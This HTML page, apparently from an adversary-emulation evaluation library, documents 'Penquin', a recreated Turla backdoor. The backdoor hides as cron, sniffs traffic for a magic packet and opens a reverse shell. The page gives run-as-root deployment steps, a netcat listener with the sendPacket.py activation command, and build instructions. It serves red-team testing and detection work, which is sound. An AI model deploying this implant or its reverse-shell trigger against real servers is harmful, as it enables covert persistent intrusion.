<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.785352632664">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.6.0">

    <!-- Primary Meta Tags -->
    <title>Penquin</title>
    <meta name="title" content="Penquin">
    <meta name="description" content="Penquin is a backdoor for re-activating access to servers over long term engagements.">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/turla/resources/penquin/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/turla/resources/penquin/">
    <meta property="og:title" content="Penquin">
    <meta property="og:description" content="Penquin is a backdoor for re-activating access to servers over long term engagements.">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/turla/resources/penquin/">
    <meta property="twitter:title" content="Penquin">
    <meta property="twitter:description" content="Penquin is a backdoor for re-activating access to servers over long term engagements.">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../favicon.png" rel="icon">
    <link href="../../../../resources/css/retype.css?v=3.6.0.785352632664" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.785352632664" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.785352632664" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.6.0.785352632664" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../" class="pr-4">
                                                ATT&​CK Evaluations Library
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Enterprise
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/turla/" class="pr-4">
                                                Turla
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/turla/resources/" class="pr-4">
                                                Resources
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/turla/resources/penquin/" class="pr-4">
                                                Penquin
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="penquin" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#penquin">#</doc-anchor-trigger>
        <span>Penquin</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div>In&nbsp;</div>
    <div><a href="../../categories/enterprise/">enterprise</a></div>
</div>

<p>Penquin is a backdoor for re-activating access to servers over long term engagements. Penquin installs a BPF filter, mimicing cron, to listen on a servers network interface. When turla sends an activation packet to the targeted host, a reverse shell is activated.</p>
<p>Penquin is broken into the following components:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Component</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>sniff.c</td>
<td>Executes cron as a child process while deploying a BPF network sniffer that waits for a matching packet. Once the matching packet it recieved, a reverse shell is executed. The reverse shell was based on the common usage of this method captured in the <a href="https://exatrack.com/public/Tricephalic_Hellkeeper.pdf" class="outbound" target="_blank"><span>ExaTrack Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>cron.h</td>
<td>A header file containing the byte array of the compiled sniff.c program (generated using the build script (<a href="build_penquin.sh">build_Penquin.sh</a>)</td>
</tr>
<tr>
<td>main.c</td>
<td>Writes Penquin to disk, then installs and executes Penquin masquerading as cron</td>
</tr>
<tr>
<td>sendPacket.py</td>
<td>Sends an activation packet to a targeted host</td>
</tr>
<tr>
<td>crypt.h</td>
<td>Obfuscates strings (max 64 char) at compile time - Deobfuscates strings at runtime</td>
</tr>
</tbody>
</table>
</div>
<br/>
<doc-anchor-target id="usage-example---manual-execution">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#usage-example---manual-execution">#</doc-anchor-trigger>
        <span>Usage Example - Manual Execution</span>
    </h2>
</doc-anchor-target>
<hr>
<p>This assumes you are running as root on the target Ubuntu system.</p>
<ol>
<li><p>From the  <code v-pre>/root/</code> folder, execute <code v-pre>penquin</code>. Total time 8 seconds to execute. There is no expected terminal output.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./hsperfdata</code></pre>
</doc-codeblock></div>
</li>
<li><p>Remove <code v-pre>penquin</code> from disk.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">rm hsperfdata</code></pre>
</doc-codeblock></div>
</li>
</ol>
<br/>
<br/>
<doc-anchor-target id="execution-checks">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#execution-checks">#</doc-anchor-trigger>
        <span>Execution checks</span>
    </h3>
</doc-anchor-target>
<hr>
<ol>
<li><p>Verify cron is running cron. <code v-pre>/usr/bin/cron -f</code> is our evil cron, <code v-pre>usr/sbin/cron -f</code> is real cron.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">systemctl status cron</code></pre>
</doc-codeblock></div>
<p>Results should look like...</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">● cron.service - Regular background program processing daemonb
 Loaded: loaded (/etc/systemd/system/cron.service; disabled; vendor preset: enabled)
 Active: active (running) since Wed 2022-12-28 19:57:19 UTC; 30s ago
   Docs: man:cron(8)
Main PID: 88494 (cron)
  Tasks: 4 (limit: 9530)
 Memory: 980.0K
 CGroup: /system.slice/cron.service
         ├─88494 /usr/bin/cron -f
         ├─88495 /usr/bin/cron -f
         ├─88496 sh -c /usr/sbin/cron -f
         └─88497 /usr/sbin/cron -f
</code></pre>
</doc-codeblock></div>
<blockquote>
<doc-anchor-target id="context-for-implementation-of-cron">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#context-for-implementation-of-cron">#</doc-anchor-trigger>
        <span>Context for Implementation of cron</span>
    </h3>
</doc-anchor-target>
<p>Based on the <a href="https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf" class="outbound" target="_blank"><span>Leonardo Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://www.youtube.com/watch?v=JXsjRUxx47E&amp;t=647s" class="outbound" target="_blank"><span>Presentation</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, Penquin deploys a legitimate version of the Linux utility <code v-pre>cron</code> and executes <code v-pre>cron</code> as a child process of Penquin. However, reporting was unclear on the series of events between Penquin’s initial execution and the execution of <code v-pre>cron</code>. To address this gap, Red Team developers hypothesized the below process tree was the objective of deploying <code v-pre>cron</code>, <a href="https://attack.mitre.org/techniques/T1036/" class="outbound" target="_blank"><span>Masquerading</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> Penquin as real cron. In order to provide this process tree, we leveraged the <a href="https://attack.mitre.org/techniques/T1543/002/" class="outbound" target="_blank"><span>Create or Modify System Process: Systemd Service</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> technique to execute Penquin.</p>
</blockquote>
<p><strong>Target Process Tree</strong></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none"> - init
 -- systemd
 --- cron (our evil cron; listens for activation packets)
 ---- cron (real Linux cron utility; does cron things)</code></pre>
</doc-codeblock></div>
 <br/>
</li>
<li><p>Verify the socket is actively listening.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">ss -l -a -n -p | grep &quot;cron&quot;</code></pre>
</doc-codeblock></div>
<p><code v-pre>p_raw</code> is where our evil cron is listening.</p>
<p>Results should look like...</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">p_raw   UNCONN  0   0   *:eth0  *   users:((&quot;cron&quot;,pid=1071197,fd=3))</code></pre>
</doc-codeblock></div>
</li>
</ol>
<br/>
<br/>
<doc-anchor-target id="activation-packet-aka-magic-packet">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#activation-packet-aka-magic-packet">#</doc-anchor-trigger>
        <span>Activation Packet (AKA Magic Packet)</span>
    </h2>
</doc-anchor-target>
<hr>
<doc-anchor-target id="on-attacker-host">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#on-attacker-host">#</doc-anchor-trigger>
        <span>On Attacker Host</span>
    </h4>
</doc-anchor-target>
<p>These steps assume sniff.c(compiled) is already running on the victim host. On the attacker host, start a listener and execute this script. This script sends a crafted packet to the victim host activating a reverse shell connecting to the listener.</p>
<ol>
<li><p>Install all <a href="requirements.txt">requirements</a></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">pip install -r requirements.txt</code></pre>
</doc-codeblock></div>
</li>
<li><p>In a terminal window, set up a <code v-pre>netcat</code> listener. Using <code v-pre>8081</code> ensures we are not conflicting with other listeners in this scenario.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">nc -lvvp 8081</code></pre>
</doc-codeblock></div>
</li>
<li><p>Open a second terminal window and navigate to the <code v-pre>/turla/Resources/Penquin</code> directory. Execute the <code v-pre>sendPacket.py</code> script. Update IPs/ports as needed - Penquin currently sniffs on all ports on the victim machine for the magic packet. Port <code v-pre>8080</code> is used based on <a href="https://lab52.io/blog/looking-for-penquins-in-the-wild/" class="outbound" target="_blank"><span>Lab52&#x27;s report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo -E python3 sendPacket.py --handler_ip 10.0.2.8 --handler_port 8081 --target_ip 10.0.1.6 --target_port 8080 --payload_type base64</code></pre>
</doc-codeblock></div>
</li>
<li><p>You will see the packet info in the terminal screen + the hexdump of the packet. The terminal output <code v-pre>Sent 1 packets</code> confirms the packet was successfully sent.</p>
</li>
<li><p>Check the terminal window with the netcat listener, the reverse shell should be running inside the victim&#x27;s <code v-pre>/root</code> directory.</p>
</li>
</ol>
<blockquote>
<doc-anchor-target id="magic-packet-context">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#magic-packet-context">#</doc-anchor-trigger>
        <span>Magic Packet Context</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Make sure that the ipaddress inside the python file is correct. The default configuration will trigger the reverse shell to localhost (127.0.0.1) on port 6792. This can be changed by specifying a custom hander IP address using <code v-pre>--handler_ip &lt;IP Address&gt;</code> and the port can be changed using <code v-pre>--handler_port &lt;port&gt;</code>. The target where the penguin implant resides can be set using <code v-pre>--target_ip &lt;IP Address&gt;</code> and the port can be adjusted using <code v-pre>--target_port &lt;port&gt;</code>.</li>
<li>The penguin implant currently only supports plain text base64 encoded payloads. This can be set in the packet generator using <code v-pre>--payload_type base64</code> alternatively, an AES encrypted payload can be sent using <code v-pre>--payload_type aes</code>.</li>
</ul>
</blockquote>
<br/>
<br/>
<doc-anchor-target id="build-instructions">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#build-instructions">#</doc-anchor-trigger>
        <span>Build Instructions</span>
    </h2>
</doc-anchor-target>
<hr>
<doc-anchor-target id="requirements">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#requirements">#</doc-anchor-trigger>
        <span>Requirements</span>
    </h3>
</doc-anchor-target>
<p>The following must be installed on the Ubuntu dev host:</p>
<ul>
<li><code v-pre>build-essential</code></li>
<li><code v-pre>libpcap-dev</code></li>
<li>Ensure the <code v-pre>GCC</code> version is compatible between build host &amp; victim host</li>
</ul>
<p>Summary of Build Process</p>
<ol>
<li>Compile the sniffer into a binary</li>
<li>Convert the sniffer binary into a header file using <code v-pre>xxd</code></li>
<li>Add <code v-pre>extern</code> to variables contained in the header file</li>
<li>compile <code v-pre>penquin</code> program with the header file containing the sniffer binary</li>
</ol>
<br/>
<ol>
<li><p>Navigate to the <code v-pre>/Resources/Penquin/</code> folder</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /Resources/Penquin/</code></pre>
</doc-codeblock></div>
</li>
<li><p>Verify the <code v-pre>build_Penquin.sh</code> exists in the folder with executable permissions.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">ls -lart build_Penquin.sh</code></pre>
</doc-codeblock></div>
</li>
<li><p>Execute the build script (<a href="build_penquin.sh">build_Penquin.sh</a>).</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./build_Penquin.sh</code></pre>
</doc-codeblock></div>
<p>Results should look like the following:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">Compiling the sniffer...
✔ ./sniff.c exists
✔ Success: gcc -s -O3 -o cron sniff.c -lpcap
✔ ./cron exists
Success! Sniffer compiled as cron.

Converting sniffer to a header file...
✔ Success:
✔ ./cron.h exists
Inserting external variable into header file...
✔ Success:
✔ Success:
Success! Header file modified.

Compiling penquin &amp; the embeding the header file...
✔ ./main.c exists
✔ Success: gcc -s -w -O3 -o hsperfdata main.c
✔ ./hsperfdata exists
Zipping Penquin...
adding: hsperfdata (deflated 76%)
✔ Success: zip hsperfdata.zip hsperfdata
✔ Success: mv ./hsperfdata.zip ./hsperfdata
✔ ./hsperfdata exists
Success! Penquin compiled as hsperfdata &amp; zipped
NOTE: Without the extension of .zip

Cleaning up build artifacts...
✔ Success: rm ./cron
✔ ./cron exists
✔ Success: rm ./cron.h
✔ ./cron.h exists
Clean up complete
PATH to binary: /path/to/Penquin/binary/hsperfdata</code></pre>
</doc-codeblock></div>
</li>
<li><p>Verify the Penquin binary is present. The binary location is provided in the last line of the terminal output.</p>
</li>
</ol>
